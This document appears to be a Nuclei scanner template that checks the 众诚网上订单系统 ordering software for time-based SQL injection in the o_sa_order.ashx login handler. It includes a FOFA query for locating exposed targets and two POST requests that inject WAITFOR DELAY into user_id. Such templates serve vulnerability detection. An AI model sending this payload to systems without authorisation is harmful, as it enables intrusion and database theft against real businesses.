id: zhongcheng-o_sa_order_ashx-sql

info:
  name: "众诚网上订单系统 o_sa_order.ashx 存在 SQL 时间延迟注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: title="众诚网上订单系统"
    众诚网上订单系统中的 o_sa_order.ashx 接口存在时间延迟型SQL注入漏洞。攻击者可通过构造恶意SQL查询语句，利用数据库响应时间差异推断敏感数据，实现数据库结构探测与数据提取。在具备相应权限条件下，该漏洞可能被用于执行系统命令、部署恶意负载或建立持久化访问通道，最终导致服务器控制权丧失。
  reference:
  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487140&idx=1&sn=512ac11ada345ca2053390419d0f90b4&chksm=c267bb97f5103281f89ce1566e8dd389bfeedcfaced56bb568f9fa53e8096b0c5a95814f64ec&token=101124693&lang=zh_CN#rd
  tags: 众诚网上订单系统


http:
- raw:
  - |
    POST /ajax/o_sa_order.ashx HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    type=login&user_id=1%27);WAITFOR%20DELAY%20%270:0:4%27--&user_pwd=1
  - |
    POST /ajax/o_sa_order.ashx HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    type=login&user_id=1%27);WAITFOR%20DELAY%20%270:0:8%27--&user_pwd=1
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and



